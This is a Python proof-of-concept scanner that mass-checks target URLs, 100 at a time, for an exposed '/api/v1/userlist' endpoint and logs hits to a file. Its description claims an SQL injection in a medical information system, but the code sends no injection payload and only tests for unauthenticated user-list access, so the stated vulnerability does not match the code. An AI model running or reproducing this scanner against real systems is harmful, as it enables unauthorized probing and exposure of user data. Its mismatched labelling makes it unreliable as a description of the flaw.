import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
     .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |  
| |  _________   | || |      __      | || |    _______   | || |  ____  ____  | || |     ______   | || | ____   ____  | || |  _______     | |  
| | |_   ___  |  | || |     /  \     | || |   /  ___  |  | || | |_  _||_  _| | || |   .' ___  |  | || ||_  _| |_  _| | || | |_   __ \    | |  
| |   | |_  \_|  | || |    / /\ \    | || |  |  (__ \_|  | || |   \ \  / /   | || |  / .'   \_|  | || |  \ \   / /   | || |   | |__) |   | |  
| |   |  _|  _   | || |   / ____ \   | || |   '.___`-.   | || |    \ \/ /    | || |  | |         | || |   \ \ / /    | || |   |  __ /    | |  
| |  _| |___/ |  | || | _/ /    \ \_ | || |  |`\____) |  | || |    _|  |_    | || |  \ `.___.'\  | || |    \ ' /     | || |  _| |  \ \_  | |  
| | |_________|  | || ||____|  |____|| || |  |_______.'  | || |   |______|   | || |   `._____.'  | || |     \_/      | || | |____| |___| | |  
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |  
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |  
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/api/v1/userlist?pageindex=0&pagesize=10"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/58.0.3029.110 Safari/537.36",
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5, proxies=proxies)
        if res1.status_code == 200 and "ID" in res1.text:
            logger.info(f"[+] {target} 存在漏洞")
            with open("Easyre.txt",'a', encoding='utf-8') as f:
                f.write(target + "\n")
            return True
        else:
            logger.info(f"[-] {target} 不存在漏洞")
    except Exception as e:
        logger.error(f"[-] {target} 连接失败 {e}")
        return False


if __name__ == '__main__':
    main()
